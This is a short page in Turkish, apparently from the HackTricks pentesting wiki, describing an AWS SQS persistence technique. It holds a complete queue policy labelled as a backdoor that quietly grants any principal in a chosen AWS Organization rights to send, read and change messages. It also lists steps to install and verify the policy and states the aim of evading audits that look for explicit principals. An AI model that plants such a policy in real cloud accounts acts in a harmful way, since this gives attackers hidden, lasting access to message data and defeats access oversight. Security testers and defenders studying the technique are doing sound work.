# AWS - SQS OrgID Policy Backdoor

{{#include ../../../../banners/hacktricks-training.md}}

aws:PrincipalOrgID koşulunu kullanarak bir SQS queue resource policy'sini suistimal edip hedef bir AWS Organization'a ait herhangi bir principal'e Send, Receive ve ChangeMessageVisibility izinlerini sessizce verin. Bu, genellikle yalnızca açık hesap veya role ARNs veya star principals arayan kontrollerden kaçan organizasyon düzeyinde gizli bir yol oluşturur.

### Backdoor policy (SQS queue policy'ye ekleyin)
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Sid": "OrgScopedBackdoor",
"Effect": "Allow",
"Principal": "*",
"Action": [
"sqs:ReceiveMessage",
"sqs:SendMessage",
"sqs:ChangeMessageVisibility",
"sqs:GetQueueAttributes"
],
"Resource": "arn:aws:sqs:REGION:ACCOUNT_ID:QUEUE_NAME",
"Condition": {
"StringEquals": { "aws:PrincipalOrgID": "o-xxxxxxxxxx" }
}
}
]
}
```
### Adımlar
- AWS Organizations API ile Organization ID'yi edinin.
- SQS kuyruğunun ARN'sini alın ve yukarıdaki statement'ı içerecek şekilde kuyruğun politikasını ayarlayın.
- Bahsi geçen Organization'a ait herhangi bir principal'dan kuyruğa mesaj gönderip alarak erişimi doğrulayın.

### Etki
- Belirtilen AWS Organization içindeki herhangi bir account tarafından SQS mesajlarının okunması ve yazılmasına yönelik Organization genelinde gizli erişim.

{{#include ../../../../banners/hacktricks-training.md}}
